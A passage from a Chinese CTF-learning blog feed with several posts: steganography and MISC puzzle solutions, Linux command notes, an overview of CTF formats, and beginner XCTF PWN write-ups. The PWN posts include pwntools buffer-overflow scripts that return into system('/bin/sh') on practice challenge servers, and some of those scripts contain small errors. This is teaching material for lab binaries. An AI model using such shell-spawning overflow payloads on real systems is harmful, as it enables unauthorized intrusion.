color="red"><strong>outguess</strong></font></h4><p>安装：</p><blockquote><p>git clone <a href="https://github.com/crorvick/outguess]">https://github.com/crorvick/outguess]</a></p><p>cd进文件夹</p><p>./configure &amp;&amp; make &amp;&amp; make install</p></blockquote><p>使用：</p><blockquote><p>outguess -k 密钥 -d 文件名 存放文件</p></blockquote><p>下载下来之后先看属性，</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211210210914672.png" alt="image-20211210210914672"></p><p>明显的社会主义核心价值观编码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211210210950958.png" alt="image-20211210210950958"></p><p>经过查找后，我们发现outguess是一种隐写方式</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211210211102425.png" alt="image-20211210211102425"></p><h3 id="excel爆破"><a href="#excel爆破" class="headerlink" title="excel爆破"></a>excel爆破</h3><p>直接打开文件显示需要密码，选择改变文件后缀名，打开txt，发现内容不少</p><p>直接搜索flag，查到</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211214143625902.png" alt="image-20211214143625902"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="MISC" scheme="https://0410wzn.top/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界PWN新手区WP（长期更新）</title>
    <link href="https://0410wzn.top/2021/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAWP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://0410wzn.top/2021/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAWP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2021-11-17T11:02:54.000Z</published>
    <updated>2021-12-09T03:39:11.852Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="攻防世界PWN新手区WP（长期更新）"><a href="#攻防世界PWN新手区WP（长期更新）" class="headerlink" title="攻防世界PWN新手区WP（长期更新）"></a>攻防世界PWN新手区WP（长期更新）</h1><blockquote><p>题目地址：<a href="https://adworld.xctf.org.cn/task/task_list?type=pwn&amp;number=2&amp;grade=0">https://adworld.xctf.org.cn/task/task_list?type=pwn&amp;number=2&amp;grade=0</a></p></blockquote><h2 id="一、get-shell"><a href="#一、get-shell" class="headerlink" title="一、get_shell"></a>一、get_shell</h2><p>  获取靶场,nc登上查看即可，</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117192610443.png" alt="image-20211117192610443" style="zoom:33%;"><h2 id="二、Hello-pwn"><a href="#二、Hello-pwn" class="headerlink" title="二、Hello pwn!"></a>二、Hello pwn!</h2><p>  首先拖进ksli里，用checksec看看文件多少位，以及保护措施的开关。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117193524850.png" alt="image-20211117193524850" style="zoom: 75%;"><p>  嗯，只开了NX，好耶！</p><p>  接下来用64位的ida打开分析逻辑，如下图</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117194019299.png" alt="image-20211117194019299" style="zoom:50%;"><p>  看准“&amp;”，重拳出击。很明显，本题要求我们输入数据到unk_601068的位置上，并在dword_60106C等于1853186401时，输出flag。</p><p>  明白运行逻辑，我们就明白了，我们需要向其中填入垃圾数据时其溢出到dword_60106C，这样程序就可以运行函数拿到flag，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;地址&#x27;</span>， 端口)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x60106C</span> - <span class="number">0x60106C</span>) + p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;bof\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>  运行，皆大欢喜。</p><p>  <img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117195744632.png" alt="image-20211117195744632"></p><h2 id="三、level0"><a href="#三、level0" class="headerlink" title="三、level0"></a>三、level0</h2><p>  先用checksec看一下文件位数和保护措施，如下图</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/level0_01.png" alt="level0_01" style="zoom:75%;"><p>  依旧是只有NX开了，题目应该比较简单</p><p>  将文件拖入ida，先分析与运行逻辑，再shift + f12, 查看有没有后门函数，</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211119104858061.png" alt="image-20211119104858061" style="zoom: 90%;"> <p>  发现上图输入出存在栈溢出可能（buf为80字节，要输入200字节），然后去找后门函数</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211119105037317.png" alt="image-20211119105037317" style="zoom:75%;"><p>  发现有“/bin/sh”，同时有system，点进去发现后门在名为“callsystem”的函数里，因此我们的目标很明确了，同通过栈溢出将buf覆盖，并将epb转移到函数上，使程序运行后门函数，编写脚本即可，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context,arch = <span class="string">&quot;amd64&quot;</span>// 切换环境</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;地址&#x27;</span>, 端口)</span><br><span class="line"></span><br><span class="line">callsystem = <span class="number">0x400596</span>// 函数在栈中的位置</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">0x08</span>) + p64(callsystem)// 使程序最终运行后门函数</span><br><span class="line"></span><br><span class="line">io = sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>  运行脚本，结果如下，成功控制服务器，寻找、查看flag即可。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211119110053521.png" alt="image-20211119110053521" style="zoom:50%;"><h2 id="四、level2-level1去哪了"><a href="#四、level2-level1去哪了" class="headerlink" title="四、level2 (level1去哪了???)"></a>四、level2 (level1去哪了???)</h2><p>在做完看不见的level1之后，我们来到了level2🐶</p><p>首先，查看一下文件的信息与保护措施</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208135638738.png" alt="image-20211208135638738"></p><p>32位可执行程序，只开启了NX，因此不能直接使用shellcode，但是可以进行栈溢出，构建ROP链。</p><p>拖进ida查看一下</p><table frame="void">    <!--使用table标签，且frame=void消除外边框-->    <tr>           <!--<tr>一行的内容<\tr>，<td>一个格子的内容<\td>-->    <td><center><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208140417769.png" alt="第一张图片显示不出时显示的文字" height="填数字作为高度"></center></td>    <!--<center>标签将图片居中-->    <td><center><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208140641524.png" alt="第二张图片显示不出时显示的文字" height="高度一致会好看"></center></td>    </tr></table><p>很好，有system函数和/bin/sh字符串，应该不需要自己构建了，溢出覆盖即可，接下来查看函数</p><p>main函数如下：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208140205803.png" alt="image-20211208140205803"></p><p>接着查看vulnerable_function函数：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208140847287.png" alt="image-20211208140847287"></p><p>这里存在明显可以发生栈溢出的状况，到这一步，我们的思路基本上确定了，通过溢出覆盖构造一个system(“/bin/sh”)的伪栈帧，vulnerable_function()执行结束后返回到我们构造的伪栈帧去执行system(“bin/sh”)，这样就可以获取shell。</p><p>上linux！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208141809821.png" alt="image-20211208141809821"></p><p>首先查找system函数和/bin/sh/字节的地址（这里刚学习使用elf直接查找，用ida也可以）</p><p>接下来就是编写脚本了，具体思路就是：</p><p>将返回地址覆盖为system函数，再将system函数引向/bin/sh字节，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;地址&#x27;</span>, 端口)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys_addr = <span class="number">0x8048320</span></span><br><span class="line">bin_addr = <span class="number">0x804a024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>其中的p32(0) ，是为了栈平衡，覆盖函数的返回地址，system的参数实际上是两字节后的/bin/sh。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211209111403902.png" alt="image-20211209111403902"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="人生苦短，我学Pwn" scheme="https://0410wzn.top/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E5%AD%A6Pwn/"/>
    
  </entry>
  
  <entry>
    <title>linux学习札记</title>
    <link href="https://0410wzn.top/2021/10/20/linux%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    <id>https://0410wzn.top/2021/10/20/linux%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/</id>
    <published>2021-10-20T15:35:51.000Z</published>
    <updated>2021-10-23T16:17:49.911Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>  本学习札记立足于笔者入门linux系统命令学习时，通过OverTheWise的战争游戏，经查询、做题实践后写出，不足之处还请多多见谅。</p><h4 id="1、pwd"><a href="#1、pwd" class="headerlink" title="1、pwd"></a>1、pwd</h4><p>  pwd命令常用于得知操作者目前所在的目录名称。</p><h4 id="2、ls"><a href="#2、ls" class="headerlink" title="2、ls"></a>2、ls</h4><p>  ls命令用于显示目前操作者所在目录之下的内容</p><blockquote><ul><li>-a 显示所有文件及目录 (<font size="3" color="red"><strong>.</strong> 开头的隐藏文件也会列出</font>)</li><li>-l 除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出</li><li>-r 将文件以相反次序显示(原定依英文字母次序)</li><li>-t 将文件依建立时间之先后次序列出</li><li>-A 同 -a ，但不列出 “.” (目前目录) 及 “..” (父目录)</li><li>-F 在列出的文件名称后加一符号；例如可执行档则加 “*”, 目录则加 “/“</li><li>-R 若目录下有文件，则以下之文件亦皆依序列出</li></ul></blockquote><h4 id="3、-cat"><a href="#3、-cat" class="headerlink" title="3、 cat"></a>3、 cat</h4><p>  cat命令用于连接文件并打印到标准输出设备上</p><blockquote><ul><li><p>-n 或 –number**：由 1 开始对所有输出的行数编号。</p></li><li><p>-b 或 –number-nonblank**：和 -n 相似，只不过对于空白行不编号</p></li><li><p>-s 或 –squeeze-blank**：当遇到有连续两行以上的空白行，就代换为一行的空白行</p></li><li><p>-v 或 –show-nonprinting**：使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外</p></li><li><p>-E 或 –show-ends : 在每行结束处显示 $</p></li><li><p>-T 或 –show-tabs: 将 TAB 字符显示为 ^I</p></li><li><p>-A, –show-all：等价于 -vET</p></li><li><p>-e：**等价于”-vE”选项</p></li><li><p>-t：**等价于”-vT”选项</p></li></ul></blockquote><p>例：<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/hexobackground/07.png" style="zoom:67%;"></p><h4 id="4、-file"><a href="#4、-file" class="headerlink" title="4、 file"></a>4、 file</h4><p>  file命令通常用来查看辨别文件命名，与呆板的windows不同，linux不是通过文件后缀名去判断文件为何，而是通过判断文件的<font size="3" color="red">文件头</font>来判断的，因此linux可以准确地判断文件为何种类型。</p><blockquote><ul><li>-b 　列出辨识结果时，不显示文件名称</li><li>-c 　详细显示指令执行过程，便于排错或分析程序执行的情形</li><li>-f      &lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称</li><li>-L 　直接显示符号连接所指向的文件的类别</li><li>-m    &lt;魔法数字文件&gt; 　指定魔法数字文件</li><li>-v 　显示版本信息</li><li>-z 　尝试去解读压缩文件的内容</li><li>[文件或目录…]     要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件</li></ul></blockquote><p>  例：<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/hexobackground/12.png" style="zoom:67%;"></p><h4 id="5、-find"><a href="#5、-find" class="headerlink" title="5、 find"></a>5、 find</h4><p>  find一般用来查找指定目录下的文件，<font size="3" color="red">如果未加参数，则会将查到的子目录与文件全部显示</font>。</p><blockquote><p>由于参数过多，下面只列出较为常用的部分：</p><ul><li><p>-mount, -xdev : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件</p></li><li><p>-amin n : 在过去 n 分钟内被读取过</p></li><li><p>-anewer file : 比文件 file 更晚被读取过的文件</p></li><li><p>-atime n : 在过去n天内被读取过的文件</p></li><li><p>-cmin n : 在过去 n 分钟内被修改过</p></li><li><p>-cnewer file :比文件 file 更新的文件</p></li><li><p>-ctime n : 在过去n天内被修改过的文件</p></li><li><p>-empty : 空的文件-gid n or -group name : gid 是 n 或是 group 名称是 name</p></li><li><p>-ipath p, -path p : 路径名称符合 p 的文件，ipath 会忽略大小写</p></li><li><p>-name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写</p></li><li><p>-size n : 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。</p></li><li><p>-type c : 文件类型是 c 的文件。</p></li><li><p>d: 目录</p></li><li><p>c: 字型装置文件</p></li><li><p>b: 区块装置文件</p></li><li><p>p: 具名贮列</p></li><li><p>f: 一般文件</p></li><li><p>l: 符号连结</p></li><li><p>s: socket</p></li><li><p>-pid n : process id 是 n 的文件</p></li></ul></blockquote><p>  例：（这里与下一命令size一起列出）<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/hexobackground/16.png" style="zoom: 67%;"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="Linux命令入门" scheme="https://0410wzn.top/tags/Linux%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界MISC新手题部分WP(更新ing)</title>
    <link href="https://0410wzn.top/2021/10/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E6%96%B0%E6%89%8B%E9%A2%98%E9%83%A8%E5%88%86WP-%E6%9B%B4%E6%96%B0ing/"/>
    <id>https://0410wzn.top/2021/10/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E6%96%B0%E6%89%8B%E9%A2%98%E9%83%A8%E5%88%86WP-%E6%9B%B4%E6%96%B0ing/</id>
    <published>2021-10-10T00:34:06.000Z</published>
    <updated>2021-10-29T08:51:16.920Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="攻防世界Misc新手题WP"><a href="#攻防世界Misc新手题WP" class="headerlink" title="攻防世界Misc新手题WP"></a>攻防世界Misc新手题WP</h1><blockquote><p>地址：<a href="https://adworld.xctf.org.cn/task/task_list?type=misc&amp;number=1&amp;grade=0">https://adworld.xctf.org.cn/task/task_list?type=misc&amp;number=1&amp;grade=0</a></p></blockquote><h2 id="一、PDF"><a href="#一、PDF" class="headerlink" title="一、PDF"></a>一、PDF</h2><blockquote><p>菜猫给了菜狗一张图，说图下面什么都没有</p></blockquote><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/01.jpg" alt="01" style="zoom: 25%;"><p>  因为题目里明显提示了“下面”，我们自然便能想到文件“下面”藏着什么，其一可能在图片下面藏有信息，其二可能藏有其它文件，于是开始逐步尝试。</p><p>  首先，我们查看其属性，发现并没有什么隐藏信息，于是开始研究图片下面。</p><p>  通过办公软件，我们将pdf文件转换成word文档，以此来从物理上观察图片下的信息。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/02.jpg" alt="02.jpg" style="zoom: 50%;"><p>   当我们打开word文档，我们惊奇的发现，flag已经明显出现在眼前了！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/03.jpg" alt="03.jpg" style="zoom:25%;"><p>  复制粘贴结束。</p><h2 id="二、give-you-flag"><a href="#二、give-you-flag" class="headerlink" title="二、give_you_flag"></a>二、give_you_flag</h2><blockquote><p>菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包</p></blockquote><p>  下载附件后，看到如下动图。</p><p>​                                                            <img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/4b0799f9a4d649f09a882b6b1130bb70%20(1).gif">  </p><p>  题目中提到“文件中的”彩蛋“，所以文件中肯定有一些信息，而一张动图，是由多张静止图片组合成的，由  此想到，运用stegsolve一帧一帧的看，发现一面的一帧藏有信息—一张二维码！！！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/image-20211012164312725.png"></p><p>  我们使用分帧工具将图片提取出来，得到带有二维码的图片</p><p>​                                                                   <img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/IMG00049.bmp"></p><p>  很明显，这个二维码缺少定位角，找到定位角用图片编辑工具补上即可。补完后，扫码，flag出现。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="入门" scheme="https://0410wzn.top/tags/%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>CTF简介</title>
    <link href="https://0410wzn.top/2021/10/09/CTF%E7%AE%80%E4%BB%8B/"/>
    <id>https://0410wzn.top/2021/10/09/CTF%E7%AE%80%E4%BB%8B/</id>
    <published>2021-10-09T13:57:31.000Z</published>
    <updated>2021-10-29T08:50:20.255Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、CTF简介"><a href="#一、CTF简介" class="headerlink" title="一、CTF简介"></a>一、CTF简介</h1><p>  Capture The Flag（以下简称”CTF”）,顾名思义，即是夺取旗帜，由于相关介绍已经比较完全完全，其简介可见百度知道:<a href="https://baike.baidu.com/item/CTF/9548546?fr=aladdin">CTF</a>词条。</p><p><a href="E:\photo\CTF">CTF</a></p><h1 id="二、CTF的题目类型"><a href="#二、CTF的题目类型" class="headerlink" title="二、CTF的题目类型"></a>二、CTF的题目类型</h1><p>​    CTF的题目类型大致包括以下五种： <a href="#Web">Web</a>，<a href="#Pwn">Pwn</a>，<a href="#Misc">Misc</a>， <a href="#Reverse">Reverse</a>，<a href="#Crypto">Crypto</a></p><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>​    Web类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如<code>SQL注入</code>、<code>XSS</code>、<code>代码执行</code>、<code>代码审计</code>等等都是很常见的考点。一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件.</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>​    Pwn类题目重点考察选手对于<code>二进制漏洞的挖掘和利用</code>能力，其考点也通常在<code>堆栈溢出</code>、<code>格式化漏洞</code>、<code>UAF</code>、<code>Double Free</code>等常见二进制漏洞上。选手需要根据题目中给出的二进制可执行文件进行逆向分析，找出其中的漏洞并进行利用，编写对应的漏洞攻击脚本(<code>Exploit</code>)，进而对主办方给出的远程服务器进行攻击并获取flag通常来说Pwn类题目给出的远程服务器信息为<code>nc IP_ADDRESS PORT</code>，例如<code>nc 1.2.3.4 4567</code>这种形式，表示在<code>1.2.3.4</code>这个IP的<code>4567</code>端口上运行了该题目</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><pre><code>Misc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag</code></pre><p>   常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>​    Reverse题目考察选手<code>逆向工程</code>能力。题目会给出一个可执行二进制文件，有些时候也可能是Android的APK安装包。选手需要逆向给出的程序，分析其程序工作原理。最终根据程序行为等获得flag。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>​    Crypto类题目考察选手对<code>密码学</code>相关知识的了解程度，诸如<code>RSA</code>、<code>AES</code>、<code>DES</code>等都是密码学题目的常客。有些时候也会给出一个加密脚本和密文，根据加密流程逆推出明文。</p><h1 id="三、CTF的比赛形式"><a href="#三、CTF的比赛形式" class="headerlink" title="三、CTF的比赛形式"></a>三、CTF的比赛形式</h1><p>  CTF的比赛形式主要包括以下几种：<a href="#%E7%90%86%E8%AE%BA%E7%B1%BB">理论类</a>，<a href="#Jeopardy-%E8%A7%A3%E9%A2%98">Jeopardy-解题</a>)，<a href="#AwD-%E6%94%BB%E9%98%B2">AwD-攻防</a>，<a href="#RHG-%E8%87%AA%E5%8A%A8%E5%8C%96">RHG-自动化</a>，<a href="#RW-%E7%9C%9F%E5%AE%9E%E4%B8%96%E7%95%8C">RW-真实世界</a>，<a href="#KoH-%E6%8A%A2%E5%8D%A0%E5%B1%B1%E5%A4%B4">KoH-抢占山头</a>，<a href="#Mix-%E6%B7%B7%E5%90%88">MIX-混合</a></p><h2 id="理论类"><a href="#理论类" class="headerlink" title="理论类"></a>理论类</h2><p>​    理论题多见于国内比赛，通常为选择题。包含单选及多选，选手需要根据自己所学的相关理论知识进行作答。最终得出分数。理论部分通常多见于初赛或是初赛之前的海选</p><h2 id="Jeopardy-解题"><a href="#Jeopardy-解题" class="headerlink" title="Jeopardy-解题"></a>Jeopardy-解题</h2><p>​    参赛队伍可以通过互联网或者现场网络参与，参数队伍通过与在线环境交互或文件离线分析，解决网络安全技术挑战获取相应分值，类似于 ACM 编程竞赛、信息学奥林匹克赛，根据总分和时间来进行排名。 不同的是这个解题模式一般会设置 一血(First Blood) 、 二血(Second Blood) 、 三血(Third Blood) ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。 当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。一般称之为动态积分 题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。</p><h2 id="AwD-攻防"><a href="#AwD-攻防" class="headerlink" title="AwD-攻防"></a>AwD-攻防</h2><p>​    <strong>A</strong>ttack <strong>w</strong>ith <strong>D</strong>efense(AwD)全称攻防模式，在攻防模式CTF赛制中，参赛队伍连接到同一个网络空间。主办方会预先为每个参赛队分配要防守的主机，该主机称之为GameBox，每个队伍之间的GameBox配置及漏洞是完全一致的，选手需要防护自己的GameBox不被攻击的同时挖掘漏洞并攻击对手服务来得分。在AwD中主办方会运行一个名为Checker的程序定时检测选手的GameBox的运行状态。若检测到状态不对则判定该GameBox宕机，按照规则扣除一定分数。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续24至48小时左右），同时也比团队之间的分工配合与合作。 AwD通常仅包含Web及Pwn两种类型的题目。每个队伍可能会分到多个GameBox，随着比赛的进行，最早的GameBox可能会下线，同时会上线新的GameBox。</p><h2 id="RHG-自动化"><a href="#RHG-自动化" class="headerlink" title="RHG-自动化"></a>RHG-自动化</h2><p>​    <strong>R</strong>obo <strong>H</strong>acking <strong>G</strong>ame(RHG)该利用人工智能或是AI或是自动化攻击程序来全自动的挖掘并利用漏洞，考验选手对于漏洞理解以及工程化能力。比赛开始前(一般为1-4周左右)主办方会给出测试环境以及相关接口文档。选手需要编写自动化程序来请求接口获取题目相关信息，该类程序通常称之为bot，在程序中全自动访问并挖掘目标漏洞，完成利用漏洞攻击并获取flag的过程。获取到的flag也由程序自动化提交。RHG因为是由bot全自动进行工作，所以比赛开始即可视为结束。剩下的一切全看参赛选手编写的自动化bot的工作情况。 比赛过程中不允许选手对bot进行任何的操作(包括debug/patch等等)。选手仅能看到自己的bot完成了哪些题。目前的得分情况等等。</p><h2 id="RW-真实世界"><a href="#RW-真实世界" class="headerlink" title="RW-真实世界"></a>RW-真实世界</h2><p>​    <strong>R</strong>eal <strong>W</strong>orld(RW) 首次于2018年长亭科技主办的RealWorldCTF中出现，该赛制着重考察选手在面对真实的环境下的漏洞挖掘与利用能力。通常RW模式出题也会围绕着能够应用于真实渗透攻击当中的漏洞，一般来说RW常见题型为VM/Docker逃逸、针对浏览器的攻击、针对IoT/Car等设备的攻击，Web类攻击等等 在RW赛制中会有一个Show Time，当选手认为自己已经可以完成题目时，选手可以在比赛平台上提交展示申请，由工作人员根据申请先后顺序进行展示排期。选手展示之前需要上台并连接相关网络，同时现场大屏会切换至目标的正常页面。选手确认连接并测试OK之后开始计时。一般情况下上台攻击的时间为5分钟，选手一旦完成攻击现场大屏幕会实时看到攻击的效果，此时裁判会根据效果是否符合题目要求来判定该题是否完成。如5在攻击时间内依然未能看到展示效果则认为本次攻击失败。现如今为了防止选手恶意排期。通常会有一个队伍总展示次数(例如在2019年数字经济云安全公测大赛中每个队伍只允许上台展示30次)，选手也需要尽可能保证上台之后攻击的成功率 举个例子。题目要求需要攻击位于比赛网络中的某个网站并将首页替换为包含队伍名称的页面。题目给出该网站的一些信息(源代码/数据库等等)，选手经过本地挖掘漏洞之后，提交展示申请，排期到了之后进行上台展示。注意，因为RW模式是以展示效果来作为题目是否完成的准则，所以在RW模式中并不存在Flag。</p><h2 id="KoH-抢占山头"><a href="#KoH-抢占山头" class="headerlink" title="KoH-抢占山头"></a>KoH-抢占山头</h2><p>​    <strong>K</strong>ing <strong>o</strong>f <strong>H</strong>ill(KoH)是近些年新衍生的一种赛制。该赛制有点类似于AwD，但是又和AwD有些不一样。选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(队伍名称或是Token之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击，主办方会定期去检查标识文件，根据文件中的队伍标识来判定本回合分数给予哪个队伍。可以看出KoH也是一种对抗极为激烈的赛制，同时考察选手的渗透能力及防御加固能力。</p><h2 id="Mix-混合"><a href="#Mix-混合" class="headerlink" title="Mix-混合"></a>Mix-混合</h2><p>​    